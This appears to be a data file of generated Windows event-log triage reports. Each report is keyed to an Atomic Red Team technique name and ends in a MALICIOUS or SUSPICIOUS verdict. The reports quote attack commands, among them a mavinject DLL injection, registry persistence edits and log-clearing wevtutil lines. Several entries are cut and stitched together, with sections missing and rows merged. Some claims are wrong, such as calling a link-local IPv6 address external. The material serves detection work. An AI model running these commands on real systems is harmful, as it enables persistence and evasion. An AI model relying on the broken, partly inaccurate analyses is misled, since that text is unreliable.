- The coordinated clearing of system logs, along with the execution of a potentially harmful script from the `AtomicRedTeam` folder, and the alteration of system time are indicative of malicious behavior.
- These actions suggest an attempt to simulate an attack and cover tracks, possibly as part of red team activities or an actual compromise.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
1. **Immediate Response:**
   - Isolate the system to prevent any further potential spread or damage.
   - Gather physical memory dumps and additional artifacts for deeper forensic analysis.

2. **Investigation and Remediation:**
   - Review user access and permissions, especially for `SERVER002\admin_test`.
   - Perform a thorough investigation of any external connections or data exfiltration that might have occurred.
   - Validate and update security policies to detect and alert on similar activities in the future.

3. **Enhancement of Security Measures:**
   - Improve monitoring solutions to detect unusual command execution and log-clearing operations.
   - Educate staff on the importance of operational security and the indicators of a compromised system.
   
Taking these steps will help minimize the impact of the detected malicious activity and strengthen the organization's defenses against future incidents."
Azure AD - adding permission to application,"Upon analyzing the provided event logs, several activities raise concerns and suggest potential malicious behavior. Below is a detailed analysis of suspicious activities:

1. **PowerShell Activity with AzureAD Module**:
   - There is a significant PowerShell activity involving the AzureAD module, opening the possibility of malicious intent. The command imports the AzureAD module and proceeds with actions like creating an application, service principal, and configuring access permissions.
   - The credentials used in the script are built using plaintext, which is not a security best practice. This could indicate an attempted unauthorized access to Azure resources.

2. **Clearing Event Logs**:
   - The Security and System event logs show evidence of being cleared shortly after the high-level PowerShell activity.
   - The event logs were cleared by the ""admin_test"" user. Clearing logs is often done to cover tracks after malicious activity, indicating a potential compromise.

3. **Suspicious Commands Involving wevtutil.exe**:
   - Multiple instances of ""wevtutil.exe"" command were executed to clear logs, as detailed in the Security log (EventID 1102) and matching entries in the System log (EventID 104).
   - ""wevtutil"" is a legitimate Windows utility, but consecutive usage, especially for clearing event logs, is unusual and suspicious.

4. **High Integrity Level Processes**:
   - The PowerShell process launches with a high integrity level, implying it ran with elevated privileges. 
   - Coupled with the creation of Azure resources and clearing logs, this elevation is suspect.

5. **Windows PowerShell Provider Logs**:
   - The Windows PowerShell logs corroborate the execution of the PowerShell script, further raising concerns since the activity is linked to potential configuration and access of Azure resources.

**Assessment**:
The combination of detailed PowerShell activity involving AzureAD manipulation, clearing critical logs, running high integrity processes, and instances of ""wevtutil.exe"" to clear logs are strong indicators of possible malicious behavior or compromise.

**Resolution**: MALICIOUS

**Recommendations**:
1. **Incident Response**: Immediately initiate an incident response procedure to contain and examine the compromised system.
2. **Credential Audits**: Reset credentials that may have been exposed, especially for sensitive Azure accounts.
3. **Log Monitoring**: Enhance monitoring to detect unauthorized log clearance and excessive privilege commands.
4. **Audit Azure Configurations**: Review Azure configurations for unauthorized changes and activity.
5. **Security Awareness**: Educate employees on the risks of using plaintext passwords in scripts and other security best practices."
Process Injection with Go using EtwpCreateEtwThread WinAPI,"### Detailed Analysis:

Upon review of the provided Windows event logs, several activities stand out as indicators of potentially malicious behavior:

1. **Event Log Clearance:**
   - Multiple instances of the event log being cleared are present, as shown by System Event ID 104 entries indicating logs being cleared by the user ""admin_test"" on the ""System"" and ""Windows PowerShell"" channels.
   - In the Security log, Event ID 1102 is another instance indicating the security log was cleared.

2. **Execution of Suspicious Processes:**
   - The PowerShell logs show evidence of suspicious command execution involving `AtomicRedTeam` artifacts (`T1055`) and suspicious executables like `EtwpCreateEtwThread.exe`. Atomic Red Team is a known framework for testing security operations which might suggest testing or an actual adversary using it for malicious activity.

3. **Use of WEvtUtil:**
   - The Sysmon logs describe processes such as ""wevtutil.exe"" being used with the command line to clear logs (e.g., ""cl System"", ""cl Application""). The WEvtUtil utility is being executed multiple times, potentially for log manipulation or clearance by ""admin_test"".

4. **Privilege Escalation Indicators:**
   - Security log Event ID 4672 indicates ""admin_test"" being assigned numerous high-level privileges including SeDebugPrivilege and others which could be abused for privilege escalation or further malicious activity.

5. **Network-Related Suspicious Logon:**
   - Logon events (Security log, Event ID 4624) using NTLM, originating from a non-standard workstation (`DESKTOP-3HL5B2P`) and indicating admin access from an external address using IPv6 (fe80::866a:d1f8:8d06:7bc), which is unusual for internal systems.

### Assessment Summary:

- The presence of cleared event logs is a significant red flag as it might indicate attempts to cover tracks after malicious activity.
- The use of legitimate tools like PowerShell and Wevtutil in potentially malicious ways adds to the suspicion.
- The activity linked to ""admin_test"" showing log clearances, suspicious privilege usage, and network logins aligns with behaviors associated with lateral movement or initial stages of intrusion.

### Resolution:

**MALICIOUS** - The combination of event log clearing, execution of suspicious executables from known attacking frameworks, multiple instances of elevated privileges, and network activity suggest confidence in a compromise or significant unauthorized action by potentially malicious actors.

### Guidance:

1. **Immediate Response:**
   - Isolate the affected system (""Server002"") from the network to prevent further potential propagation or data exfiltration.
   - Change all privileged account credentials immediately to mitigate further access.

2. **Further Investigation:**
   - Conduct a thorough forensic investigation of ""Server002"" including disk analysis and memory forensics to understand the full scope of the activities.
   - Review network logs and connections for anomalies, especially concerning the IPv6 address and system ""DESKTOP-3HL5B2P"".

3. **Post-Incident Actions:**
   - Strengthen monitoring on all systems for similar suspicious activities and privilege escalation attempts.
   - Implement strict access controls and improve logging practices to detect and prevent future incidents."
Domain Password Policy Check: No Uppercase Character in Password,"Upon analysis of the provided logs, several indicators of suspicious or potentially malicious activities stand out:

### Suspicious Findings:

1. **PowerShell Activity:**
   - Multiple PowerShell script executions involve checking and modifying password credential files, which is generally unusual and may indicate an attempt to capture or manipulate account credentials. The script checks for a password stored in a credential file and compares it with a new password for user accounts. This behavior is not common for legitimate administrative tasks unless specifically authorized and documented.

2. **Clearing of Event Logs:**
   - From the Sysmon log, we see the process `wevtutil.exe` being run multiple times to clear various event logs:
     - Security log cleared by process ID 4156: `""CommandLine"":""\""C:\\Windows\\system32\\wevtutil.exe\"" cl Security""`
     - The Application, System, and PowerShell logs are also being cleared. Clearing event logs can be an immediate attempt to cover tracks, which is a common tactic used after unauthorized or suspicious activities.

3. **Security Events:**
   - Log Event ID 1102 indicates that the security log was cleared by the `admin_test` user. Log clearing behavior is highly suspicious and usually indicative of malicious intent to hide the tracks of unauthorized activities.

4. **User Enumeration:**
   - The frequent occurrence of Event ID 4798 signifies attempts to query the Local Security Authority (LSA), which monitors known user accounts. This could suggest recon activities, potentially identifying accounts for exploitation.

5. **CompatTelRunner.exe Activity:**
   - The process `CompatTelRunner.exe`, a utility typically for telemetry, appears to be making frequent queries related to user accounts. While not generally suspicious on its own, its involvement in the user enumeration process needs scrutiny when combined with other findings.

6. **Execution of Privileged Operations:**
   - Event ID 4672 indicates special privileges were assigned to the `SYSTEM` account. While this event alone could be benign, contextually combined with log clearing and the nature of its execution, it adds to the suspicion.

### Assessment:
Considering the context and content of the log entries, the activities observed are certainly suspicious. The script behavior, combined with event log clearing, strongly indicates potential malicious activities, attempting to both manipulate credentials and cover tracks.

### Resolution:
**SUSPICIOUS**

The activities identified merit further investigation:
- Verify the legitimacy of the PowerShell scripts and validate if there is any authorized scheduled task or user action matching the Commands observed.
- Review user `admin_test`'s recent activities to verify whether they corroborate any legitimate use cases.
- Conduct a full incident response analysis by reviewing additional logs, especially correlating with network and endpoint data, to gain more evidence about unauthorized access or lateral movement across the network.
- Consider isolating the affected host (Server002) for deeper forensic analysis and consult with the IT team about potential recovery and remediation actions.

These steps should help determine whether the activities escalate to a verified malicious event or if they can be explained by benign patterns observed in further data."
secedit used to create a Run key in the HKLM Hive,"Upon reviewing the provided event logs, several entries suggest potentially suspicious activities, particularly:

1. **Log Clearance Activities:**
   - **System Log:** An entry indicates that the system logs were cleared by a user named `admin_test` (EventID 104). This can be a typical action if an administrator is conducting maintenance, but if it was unexpected, this could be an indicator of malicious behavior aimed at covering tracks.
   - **Security Log:** Additionally, the security logs were also cleared by the same user (EventID 1102). This could be seen as an attempt to hide illicit activities.

2. **Suspicious Use of `wevtutil.exe`:**
   - Entries across the Sysmon logs reveal multiple instances of `wevtutil.exe` being executed to clear logs (e.g., EventID 1 with command `wevtutil.exe cl <log>`). This is unusual behavior for automated systems and can be a strong indicator of someone trying to cover their tracks after performing activities on the system.

3. **Command Execution:**
   - There is a suspicious `cmd.exe` process execution (Sysmon EventID 1) with the command line involving `secedit` from a temporary directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1547.001\\src\\regtemplate.ini`). This could suggest the use of a known attack simulation technique (e.g., Atomic Red Team Test) or possibly a genuine administrator task. However, due to its execution from a temporary directory, it warrants further scrutiny.

4. **Edge Update Observations:**
   - There are multiple EdgeUpdate activities (e.g., EventID 1) in the Sysmon logs run under SYSTEM authority. However, these do not appear overtly malicious since software updates are routine tasks from Microsoft Edge but should be noted if any unusual behavior coincided with these times.

### Assessment:

- **Likelihood of Malicious Activity:** The presence of log clearance commands, particularly using `wevtutil.exe` and the clearance of both the system and security logs by the same user, are highly suspicious. These actions often indicate an attempt to remove evidence and can be part of malicious post-exploitation behaviors.
- **Command Executions from Temporary Location:** This kind of activity, especially if not expected or known by the administrative team, contributes to the suspicion that malicious activities may have been performed.

### Resolution:

- **Resolution: MALICIOUS**

### Recommendations:

1. **Immediate Investigation:** Conduct a thorough investigation into activities by the user `admin_test`, especially focusing on any administrative privileges and any changes made during the timestamps in question.
   
2. **Verify User Activities:** Confirm with administrators or staff if any legitimate maintenance was performed. If not, be prepared to take necessary incident response actions, including isolating the system and performing further forensic analysis.

3. **Audit Recent Changes:** Review and audit any recent changes made to systems that could correspond with privilege escalation or unusual system modifications.

4. **Enhanced Monitoring:** Implement more comprehensive monitoring and alerts for log clearance activities and any command line executions from temp directories to detect similar attempts in the future.

HKLM - Add malicious StubPath value to existing Active Setup Entry,"### Detailed Analysis of Logs

#### Suspicious or Anomalous Behavior:

1. **Use of PowerShell to Modify Registry and Launch Executable:**
   - In the Sysmon and PowerShell logs, a PowerShell command was executed which modified a registry key (`HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}`) to set the `StubPath` pointing to `calc.exe`. It also invoked `runonce.exe` with the `/AlternateShellStartup` argument.
   - The PowerShell command was executed with high integrity level which indicates elevated privileges.
   - This activity is often associated with persistence mechanism by attackers to execute a payload every time a new user logs into the system.

2. **Event Log Clearance:**
   - The security log contains an event (ID 1102) indicating the security log was cleared by `admin_test`. Clearing logs is a tactic often used by attackers to cover their tracks.

3. **Abnormal Process Behavior:**
   - Multiple instances of `wevtutil.exe` were executed by `admin_test` to clear various logs (e.g., Sysmon, Application, Security). This is unusual for regular system operations and points towards malicious intent.

4. **Time Change Event:**
   - There are time change events (Event ID 4616 in Security Log) showing the system time being altered. While legitimate updates can occur, frequent or undocumented time changes can indicate malicious activity attempting to evade detection timelines.

5. **Execution of `whoami.exe` and `conhost.exe`:**
   - There are executions of system commands like `whoami.exe` and `conhost.exe` by `admin_test`, potentially part of discovering user details or establishing a session for further malicious exploitations.

6. **Multiple Executions of `MicrosoftEdgeUpdate.exe`:**
   - Several instances of `MicrosoftEdgeUpdate.exe` were executed, some from unexpected temporary directories. While updates are normal, unusual paths, and frequencies can be concerning, indicating possible use as a vector for payload delivery.

#### Assessment and Threats

- The use of PowerShell to modify registry keys and set the StubPath is especially suspicious, as it indicates a possible setup for persistence which is atypical for normal operations.
- Log clearing actions and attempts to manipulate logs using `wevtutil.exe`, coupled with the clearing of the Windows event logs, suggest potential log tampering by `admin_test` to disguise unauthorized activities.
- Time manipulation might be used to maintain synchrony between various logs after unauthorized access or actions.

#### Guidance on How to Proceed

- **Investigate the user `admin_test`:** Verify if there is any unauthorized access or impersonation involved.
- **Review PowerShell Execution Policies:** Ensure PowerShell is set to restrict scripts and logging is enabled for future inquiries.
- **Examine the Registry Key Modified:** Confirm the validity and necessity of these registry modifications.
- **Implement Audit Policies:** Strengthen security policies revolving around event log management and system time changes.
- **Conduct a Threat Hunt:** Investigate the system for any other indicators of compromise or persistence mechanisms.
- **Evaluate Installed Applications:** Ensure that executable files like those originating suspicious processes are legitimate and not tampered with.

### Finalized Resolution: **MALICIOUS**

- The identified activities strongly suggest malicious intent, primarily due to the manipulation of system settings and attempts to obscure actions through log and time modifications. Immediate containment and further incident response measures are advised."
Process Injection with Go using CreateThread WinAPI (Natively),"Based on a detailed analysis of the provided logs, several indicators suggest potentially suspicious activity, influencing the assessment towards malicious behavior. Below is the breakdown of each significant finding:

1. **Event Log Clearing (Security Event ID 1102 and System Event ID 104):** 
   - The logs indicate multiple occurrences of the `wevtutil.exe` utility being used to clear various event log channels (Security, System, Application, and Windows PowerShell). The clearing of event logs is often a malicious actor's attempt to cover their tracks.

2. **Time Manipulation (Security Event ID 4616 and System Event ID 1):**
   - The system time appears to have been deliberately altered (repeated Event ID 4616 entries showing time rollback). This is commonly associated with attempts to evade logging or to manipulate timestamps to hinder investigations.

3. **PowerShell Scripting and Usage of Atomic Red Team Artifacts:**
   - The PowerShell logs reveal execution of a file `CreateThreadNative.exe -debug` from a temporary directory associated with ""AtomicRedTeam,"" a known toolset used for simulating attack techniques. Execution of potentially harmful scripts or binaries in PowerShell might relate to reconnaissance or further exploitation.
   
4. **Frequent Execution of `conhost.exe`:**
   - The occurrence of multiple `conhost.exe` executions in sequence with `-ForceV1` parameters and association with suspicious processes is another point of concern. While `conhost.exe` is a legitimate Windows file, excessive spawning can denote attempts at process hollowing or evasion techniques.

5. **Integrity Level and User Context:**
   - Many of the activities are executed under a high integrity level by the `admin_test` account, which has cleared event logs and executed potential malware, suggesting compromised or malicious use of privileged accounts.

**Assessment:** Based on the examination, there is sufficient evidence in the logs indicating:
- Intentional obfuscation through log clearance.
- Possible use of attack simulation tools or actual malicious activity via PowerShell.
- Time distortion manipulation, a tactical move considered unusual for typical operational tasks.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Immediately isolate the host `Server002` to prevent potential lateral movement within the network.
- Conduct thorough forensics beyond these logs on `Server002` to identify any further malicious binaries or compromised accounts.
- Revise access controls, especially for privileged accounts like `admin_test`. Consider enforced multi-factor authentication.
- Review and enhance logging and alerting mechanisms to prevent similar occurrences.
- Notify the incident response team to determine the full scope and remediate the threat."
Add Executable Shortcut Link to User Startup Folder,"Upon review of the provided logs, several points of interest indicating potential suspicious activities were observed:

### Security Log:
1. **EventID 1102** - The security log was cleared. This event is a clear indicator of potential malicious activity as it suggests someone is attempting to cover their tracks by deleting event logs. This was done by the user ""admin_test"" with the ClientProcessId of 6612.

### Application Log:
- No immediate suspicious activities were identified in the application log entries provided.

### Windows PowerShell Log:
1. **PowerShell Script Execution** - A PowerShell script was executed which creates a shortcut for ""calc.exe"" in the startup directory (""%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup""). This behavior can indicate persistence mechanisms typical in malicious activities.

### Sysmon Log:
1. **Use of Wevtutil** - Multiple instances of ""wevtutil.exe"" were executed to clear event logs (Security, Application, and Sysmon channels). This further supports the suspicion of log tampering to erase traces of actions performed.
2. **PowerShell Execution** - As seen in the PowerShell logs, power shell was used to persistently launch 'calc.exe' by creating a shortcut in the startup folder.
3. **Frequent Execution of System Tools** - Multiple executions of ""whoami.exe"" and similar system tools may indicate reconnaissance or routine checks by a script or a malicious user attempting to gather operational details.

### System Log:
1. **EventID 104** - This event log also denotes clearing of the System and Windows PowerShell logs, which aligns with malicious intentions to erase tracks.

### Risk Assessment & Guidance:
- **Indicators of Malicious Activity**: The logs clearly show evidence of event log clearing combined with script execution intended for persistence (""calc.exe"" shortcut creation in startup). These are solid indicators of potentially malicious actions.
- **Immediate Actions**:
  - **Isolate the Host**: To prevent further potential spread or data exfiltration, isolate ""Server002"" from the network.
  - **Full Forensic Investigation**: Conduct a complete forensic examination of the host to identify any additional compromises and gather more comprehensive information about the attacker’s methodologies.
  - **Change Credentials**: Change passwords for all accounts that could have been accessed on this machine, especially those with administrative rights.
  - **Audit Other Systems**: Review other systems on the same network for similar behavior, ensuring this is not part of a broader attack.
  - **Enhance Monitoring**: Implement enhanced logging and alerting measures for any future event log clearing activities or suspicious PowerShell commands.

### Resolution:
The findings strongly suggest malicious activity due to consistent log deletion events, suspicious use of PowerShell for persistence, and other system details indicating tampering. Based on this analysis, the resolution is:
- **MALICIOUS**"
Winlogon HKLM Userinit Key Persistence - PowerShell,"Based on an in-depth analysis of the provided Windows event logs, the following observations and assessments have been made:

1. **Security Log Clearing:**
   - Multiple events indicate that application, system, and security event logs were cleared (Event ID: 104, 1102), often a sign of malicious activity as attackers may clear logs to remove traces of their activity.
   - The clearing was executed by the user ""admin_test"" which is highly irregular if not done during routine maintenance, and there’s no evidence of such a sanctioned task.

2. **Windows PowerShell Activity:**
   - A PowerShell command is modifying a registry key related to `Userinit`, which points to changes in the user logon process. This modification can be associated with persistent mechanisms used by malware (Event ID: 600, 400, 403).

3. **Suspicious Command Line Activity:**
   - The PowerShell command `Set-ItemProperty` to alter `Userinit` for the logon process (under `Winlogon`) can be flagged as suspicious, as it includes adding `cmd.exe`, which may indicate a backdoor or persistence mechanism allowing an attacker to execute commands upon user logon.

4. **Unusual System Processes and Timing Adjustments:**
   - There are events showing time manipulation (Event ID: 4616), which might indicate an attempt to obfuscate the timeline of other activities.

5. **Sysmon Logs - Evidence of Scripting Activities:**
   - Sysmon logs reveal process creation of PowerShell and `wevtutil` (event log clearing tool), further supporting attempts to hide malicious behavior through log clearance.

6. **Edge Update Service Activity:**
   - The logs contain frequent entries related to Microsoft Edge Update Service, which appears to be functioning normally, but should still be monitored due to its timing and relation to potential malware often spoofing legitimate services.

**Assessment:**
The logs contain clear evidence of suspicious and potentially malicious activity. The combination of event log clearing, suspicious PowerShell usage altering system configurations specifically for user logon processes, and potential antitiming techniques suggest unauthorized and potentially harmful conduct.

**Resolution:**
- **MALICIOUS**: The actions observed - such as log file clearance, suspicious PowerShell usage for persistence, and possible cover-up of malicious activities - indicate a high likelihood of compromise.

**Guidance on How to Proceed:**
1. **Immediate Incident Response:**
   - Isolate the affected systems from the network to prevent further spread or damage.
   - Perform a comprehensive forensic investigation to determine the full extent of the compromise.

Implement these steps promptly to mitigate current risks and prevent future incidents."
Process Injection via Extra Window Memory (EWM) x64 executable,"Upon analyzing the provided logs, several indicators suggest potentially suspicious and possibly malicious activity. Below is a detailed breakdown and assessment:

1. **Clearing of Event Logs**:
   - The logs show multiple instances of event log clearing actions. An Admin user ""admin_test"" initiated the clearing of logs in the System, Security, and Windows PowerShell channels. Events with IDs 104 in System logs and 1102 in Security logs indicate that logs were cleared. Clearing of logs by an admin account is unusual in normal operations and is often associated with attempts to cover malicious activities.

2. **Usage of Wevtutil to Clear Logs**:
   - From the Sysmon logs, we observe the usage of `wevtutil.exe` with command-line arguments to clear specific logs (e.g., `""C:\\Windows\\system32\\wevtutil.exe"" cl Microsoft-Windows-Sysmon/Operational`). This action correlates with the log clearing events noted above, reinforcing the suspicion of deliberate log tampering.

3. **Suspicious PowerShell Activity**:
   - The logs show the execution of `powershell.exe` with a command pointing to a suspicious executable in the temporary directory: `T1055.011_x64.exe`. This particular naming convention aligns with a technique commonly related to security testing frameworks like Atomic Red Team and suggests potential execution of a known injection technique (T1055.011 - Process Injection) as specified by the MITRE ATT&CK framework.

4. **Presence of Atomic Red Team Execution Artifacts**:
   - The designation of `AtomicRedTeam` in file paths indicates that potentially security testing or adversary simulation activities are taking place. This could either suggest a red team exercise or unauthorized use of similar tools by a malicious actor.

5. **Use of High Privileges and System Processes**:
   - There's evidence of logon and usage of processes with high privileges (`SYSTEM`), including actions associated with elevated tokens. Even legitimate system processes are involved (`svchost.exe`, `sppsvc.exe`), but these are normal processes that can be misused for malicious purposes under the shadow of legitimate functionality.

6. **General Indicators of Compromise**:
   - The combination of log clearing, targeted usage of PowerShell to execute potentially malicious payloads, and the presence of security testing tools in potentially production or sensitive environments are classic indicators of compromise.

### Conclusion:

Based on the above observations, the activity recorded in the logs is indicative of a **MALICIOUS** nature. There is corroborative evidence of unauthorized activity meant to obscure traces (log clearing) and execute potentially harmful payloads under the guise of system utilities or testing frameworks.

### Recommended Actions:

- **Immediate Response**: Isolate the affected host to prevent further potential spread of any intrusions.
- **Containment and Eradication**: Review and halt any malicious processes identified (like `T1055.011_x64.exe`), and ensure no remnants of suspicious activity are present.
- **Recovery**: Restore affected systems from known good backups, ensuring security updates and patches are applied.
- **Investigate the Scope**: Conduct a wider investigation to determine if other systems are affected, potentially involving threat hunting to trace the extent of the breach.
- **Review Access**: Examine and possibly revoke admin access for `admin_test`, and reassess user access controls.
- **Enhanced Monitoring**: Implement more robust logging and monitoring practices to detect and prevent future occurrences.
- **Root Cause Analysis**: Identify how the breach occurred to fortify defenses against similar threats.

These actions will help in addressing the current threat and improving the overall security posture for the future."
Print Processors,"Upon reviewing the provided logs for Server002, several noteworthy activities emerge that might indicate potential malicious behavior:

1. **Sysmon Logs:**
   - The use of `wevtutil.exe`, as seen multiple times throughout the logs, is typical for clearing event logs. It's suspicious when done by a non-standard account or at unusual times. This utility was executed with high integrity, suggesting potential log tampering or reconnaissance.
   - `ProcessGuid` and `Hashes` for `wevtutil.exe` remain consistent, indicating the binary wasn't modified. However, usage frequency and context need scrutiny.
   - We observe `powershell.exe` commands: notably, they involve modifying the print processor registry key and making file copies mimicking known tactics in the MITRE ATT&CK framework, specifically for Print Spooler service abuse.
   - The presence of Microsoft’s tooling, such as `MicrosoftEdgeUpdate.exe`, seems typical given the application's auto-update nature, but it also can be repurposed for exploitation under certain security compromise scenarios.

   - Assess and restore security configurations — ensure that logging services and privileges are strictly monitored.
   - Conduct a detailed review of user privileges, especially for the `admin_test` account, and reset related passwords.

4. **Monitoring and Auditing:**
   - Enhance monitoring using SIEM tools for unusual activities such as log clearing or unexpected administrative level actions.
   - Run threat hunting exercises to detect similar activities in the network. 

Overall, this incident requires urgent attention, and the outlined steps should contribute to understanding and mitigating any potential breach effectively."
Process Injection via mavinject.exe,"**Detailed Analysis of the Logs:**

1. **Unusual Process Execution and Command-Line Arguments:**
   - **PowerShell Activity:** There are multiple instances of PowerShell being executed, particularly the instance noted in the logs where it runs a complex command involving processes like `notepad.exe` and the use of `mavinject` with a DLL located in a location related to ""AtomicRedTeam,"" a known security testing tool repository. This command is:
     ```
     ""powershell.exe"" & {$mypid = (Start-Process notepad -PassThru).id, mavinject $mypid /INJECTRUNNING ""\""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1055.001\\src\\x64\\T1055.001.dll\"""", Stop-Process -processname notepad}
     ```
     This is indicative of a test or simulation of process injection, a technique often used in advanced attacks for stealthy code execution.
   
2. **Clearing of Logs:**
   - **Logs Cleared Events:** The logs indicate that event logs for System, Windows PowerShell, and Security were cleared by the user `admin_test`. Clearing logs is a known tactic used by malicious actors to cover their tracks, hinder investigation, and maintain persistence without detection.
   
3. **Process Creations:**
   - **Conhost.exe Association:** Several instances involve `conhost.exe` spawning from processes like `wevtutil.exe`. This could be normal; however, in the context of other activities, it warrants closer examination to ensure no further nefarious activities are hidden behind such executions.
   
4. **Use of Built-in Utilities:**
   - The repeated usage of `wevtutil.exe` to interact with event logs further indicates intent to manipulate or extract event logs. For example, exporting event logs to `TempLog.evtx`.

5. **File and Image Paths:**
   - The presence of paths pointing to `AtomicRedTeam` and specific subdirectories related to process injection techniques reflects testing tools and scripts aiming to simulate attack scenarios.

**Assessment and Threats:**

- **Overall Activity:** The sequence of PowerShell execution, command-line instructions involving process injection with a DLL, and the clearing of critical event logs strongly point to behavior consistent with penetration testing activity or simulation by a red team. However, similar behavior could also be exhibited by a malicious actor.
- **Potential Risks:** If this activity is not sanctioned or expected as part of a testing routine, it poses a significant risk indicating compromise or attempted malicious activity. Event log clearing, in particular, is highly suspicious and often linked with efforts to hide evidence of malicious behavior.

**Resolution:**

- **Resolution Recommendation:** **MALICIOUS**

Given the context, if the organization did not authorize red team exercises or threat simulations involving the user `admin_test`, these activities are indicative of malicious behavior. Immediate steps should be taken to isolate the system, investigate the source and intent of these commands, and review the credentials used.

**Guidance on Proceeding:**

- **Containment:** Immediately isolate the affected host to prevent potential lateral movement within the network.
- **Investigation:** Further analyze the integrity and current state of other potentially affected hosts or accounts.

Azure AD - Add Company Administrator Role to a user,"### Detailed Analysis

Upon investigating the provided event logs from the Windows host, several activities stand out as potentially suspicious or indicative of malicious behavior.

#### 1. **Log File Clearing (Security and System Log ID 1102/104)**
- **Details:** Multiple entries show that log files were cleared using the `wevtutil` command, performed by the user `admin_test`. The security log showing Event ID 1102 and system log showing Event ID 104 are indicative of a log clearance action, which is often a technique used to cover tracks after unauthorized or malicious activity.
- **Assessment:** Log clearing is not a common legitimate administrative activity unless under specific maintenance conditions and must be considered suspicious if unexplained.

#### 2. **Suspicious PowerShell Activity (PowerShell Log and Sysmon Log)**
- **Details:** There are several PowerShell commands executed that involve sensitive operations:
  - Importing the MSOnline module
  - Creating a secure string for a password
  - Using the credentials to connect and add a role member as a ""Company Administrator""
  - Execution of potentially risky commands with admin privileges.
- **Assessment:** This execution pattern is highly indicative of privilege escalation or user account manipulation. The use of a known administrative role without apparent justification, especially combined with cleared logs, suggests malicious intent.

#### 3. **Command Execution Using High-Integrity Processes (Sysmon Log)**
- **Details:** Processes like `wevtutil.exe`, `hostname.exe`, and `whoami.exe` were executed in rapid succession. Notably, `wevtutil.exe` was used to clear logs across several channels, which aligns with techniques used to hide forensic evidence.
- **Assessment:** The execution of these processes at high integrity levels and in conjunction with suspicious PowerShell activities aligns with advanced threat actor methodologies to maintain access while avoiding detection.

### Indicators of Malicious Activity

- **Log File Clearing:** A quintessential example of covering tracks post-execution of malicious activity.
- **PowerShell Abuse:** Using PowerShell for administrative level changes/access, especially with known modules like MSOnline, points towards unauthorized privilege escalation.
- **Pattern of Execution:** The sequence and nature of command executions (PowerShell and system utility tools) reveal a coordinated attempt to compromise the system.

### Final Assessment

**Resolution: MALICIOUS**

The combination of log clearing, suspicious PowerShell commands involving credential usage, and high-integrity process executions strongly suggests malicious activity. Indicators align with common intrusion and persistence mechanisms, indicating potential compromise of the system.

   - Prepare for potential communication of the incident to regulatory bodies if sensitive data is involved."
Persistence by modifying Windows Terminal profile,"Based on the provided logs, here's a detailed analysis of the events:

1. **PowerShell Execution with Malicious Intent:**
   - There is a clear invocation of PowerShell with a command that involves moving a `settings.json` file and invoking a web request to download another `settings.json` from a GitHub repository (`https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.015/src/settings.json?raw=true`). This behavior is suspicious as it could indicate an attempt to manipulate or replace configurations for the Windows Terminal, potentially as a persistence method via a trojanized configuration file.

2. **Unusual Usage of `wevtutil.exe`:**
   - There are multiple usages of `wevtutil.exe` which is often used to export, clear, or manage Windows Event logs. In this case, it was used to clear the following logs:
     - Sysmon Operational log
     - Application log
     - System log
     - Security log
   - Clearing these logs is a strong indicator of malicious activity because attackers typically clear logs to cover their tracks.

3. **High Integrity Level Processes:**
   - The processes were executed with a high integrity level, indicating they had administrative privileges. This potentially exacerbates the risk, as any malicious action carried out under these privileges could affect the whole system.

4. **Log Clearing Events Correlate with Other Suspicious Activities:**
   - The log clearing activities correlate with timestamps of suspicious PowerShell execution, suggesting that the actor might have cleared the logs immediately after executing potentially malicious commands to remove traces of their activities.

5. **Use of Common System Utilities:**
   - Execution of `whoami.exe` and `hostname.exe` is noted. These can be used by attackers to gather information about the compromised system and confirm their executed commands' context and privileges.

**Assessment and Resolution:**
Given the suspicious use of PowerShell to move and manipulate configuration files with external downloads, followed by the deliberate clearing of various crucial event logs, these actions are indictive of a compromise attempt and are consistent with tactics commonly used by attackers to maintain persistence and to cover their tracks.

- **Resolution: MALICIOUS**

**Guidance on How to Proceed:**
1. Immediately isolate the host Server002 from the network to prevent further potential spread of malicious activities.
2. Conduct a deep forensic investigation on Server002, focusing on:
   - Further examining the changes made to configurations and files.
   - Recovering deleted logs if possible to determine the full extent of actions taken by the malicious actor.
3. Review and audit similar activity across other systems to identify potential lateral movement or wider compromise within the network.
4. Change relevant credentials and enforce stricter access controls to prevent unauthorized access.
5. Analyze network traffic patterns around the timestamps for any external communications or data exfiltration attempts.
6. Plan for a comprehensive incident report and clean-up operation, potentially involving reinstallation of compromised systems.

For future prevention, consider enhancing logging capabilities, educating users on potential phishing attempts, and implementing stricter policies around the use of PowerShell and other administrative utilities."
Add Port Monitor persistence in Registry,"Based on the provided logs, here's the analysis:

### Suspicious or Anomalous Behavior:
1. **Event Log Clearing**:
   - The security log shows Event ID 1102, indicating that the security event log on `Server002` has been cleared by the user `admin_test`. This is typically considered suspicious behavior as malicious actors often clear logs to cover their tracks after unauthorized activities.

2. **Sysmon Logs Related to `wevtutil.exe`**:
   - The Sysmon logs show a series of events involving `wevtutil.exe` being executed with the command `cl` (clear logs) on various channels, including ""Security"", ""System"", and ""Windows PowerShell"". The processes were executed by the user `SERVER002\admin_test`, which aligns with the user that cleared the log.

3. **Suspicious Command Execution**:
   - We observe a `cmd.exe` process being executed with a registry edit command that involves changing a registry key that could potentially be used for persistence by loading a DLL located in a temporary directory (`AtomicRedTeam\T1547.010\bin\PortMonitor.dll`). The command `reg add` suggests an attempt to modify the system's configuration to load a potentially malicious DLL.

4. **MicrosoftEdgeUpdate.exe Execution**:
   - Numerous processes related to `MicrosoftEdgeUpdate.exe` are present in the logs. Although these processes seem related to legitimate Microsoft Edge updates, they could potentially be used for lateral movement or persistence depending on the context.

### Malicious Activity or Compromise:
- The combination of cleared event logs, execution of `wevtutil.exe` to clear specific logs, and suspicious registry modifications indicate a possible compromise scenario. These actions are typical steps in a post-exploitation phase where an attacker attempts to maintain persistence, evade detection, and leave minimal artifacts for detection.

### Assessment and Threats:
The analyzed logs present strong indicators of malicious activity. The clearing of security logs, command executions for registry modifications, and suspicious use of system utilities (`wevtutil.exe`) to clear logs align with typical tactics used by attackers post-compromise.

### Guidance and Resolution:
